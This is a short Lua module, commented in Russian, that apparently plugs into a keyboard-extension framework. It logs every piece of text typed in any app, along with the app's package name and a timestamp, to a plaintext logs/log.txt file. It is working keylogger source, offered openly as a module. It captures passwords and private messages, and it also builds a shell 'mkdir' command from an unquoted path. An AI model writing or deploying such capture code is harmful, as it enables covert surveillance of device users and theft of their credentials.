--[[

Logger

Модуль который записывает весь текст написанный на клавиатуре, хранит файл в logs/log.txt относительно места установки модуля, помимо текста пишет имя пакета приложения и текущую дату

--]]

local currentPackageName, lastString, log

local function startsWith(text, start)
    return text:sub(1, #start) == start
end

local function logger(input)
    local packageName = input:getPackageName()
    if packageName ~= currentPackageName then
        log:write("\n\n")
        log:write(packageName)
        log:write(" ")
        log:write(os.date("%c"))
        log:write("\n")
        currentPackageName = packageName
    end
    local text = input:getText()
    if text == nil or text.toString == nil then
        return
    end
    text = text:toString()
    if lastString ~= nil and startsWith(text, lastString) then
        text = text:sub(#lastString + 1, #text)
        lastString = lastString .. text
    else
        log:write("\n")
        lastString = text
    end
    log:write(text)
end

return function(module)
    local path = module:getFilepath()
    local dirpath = path:sub(1, path:match("^.*()/")) .. "logs"

    os.execute("mkdir " .. dirpath)
    log = io.open(dirpath .. "/log.txt", "a")

    if log == nil then
        inline:toast("logger: Failed to open log file")
        return
    end

    module:registerWatcher(logger)
end